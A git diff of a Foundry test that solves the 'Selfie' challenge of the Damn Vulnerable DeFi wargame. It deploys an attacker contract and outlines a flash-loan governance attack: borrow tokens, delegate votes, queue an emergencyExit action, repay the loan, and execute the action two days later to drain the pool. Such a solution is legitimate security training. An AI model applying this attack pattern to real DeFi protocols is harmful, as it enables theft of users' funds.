@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
+import {SelfiePoolAttacker} from "../../src/selfie/SelfiePoolAttacker.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
 contract SelfieChallenge is Test {
@@ -18,6 +19,7 @@ contract SelfieChallenge is Test {
     DamnValuableVotes token;
     SimpleGovernance governance;
     SelfiePool pool;
+    SelfiePoolAttacker poolAttacker;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -62,7 +64,25 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        vm.stopPrank();
+        vm.startPrank(player);
+        console.log(token.balanceOf(player), 'balance');
+        console.log(token.balanceOf(recovery), 'recovery balance');
+
+        // Deploy pool attacker
+        poolAttacker = new SelfiePoolAttacker(address(pool), address(token), address(governance), recovery);
+
+        // 1. request flash loan
+        // 2. deletegate loan to votes
+        // 3. use the tokens to register emergencyExit action inside the governance
+        // 4. repay the loan
+        poolAttacker.attack();
         
+        // execute the emergencyExit
+        skip(2 days);
+        governance.executeAction(1);
+
+        console.log(token.balanceOf(recovery), 'recovery balance');
     }
 
     /**
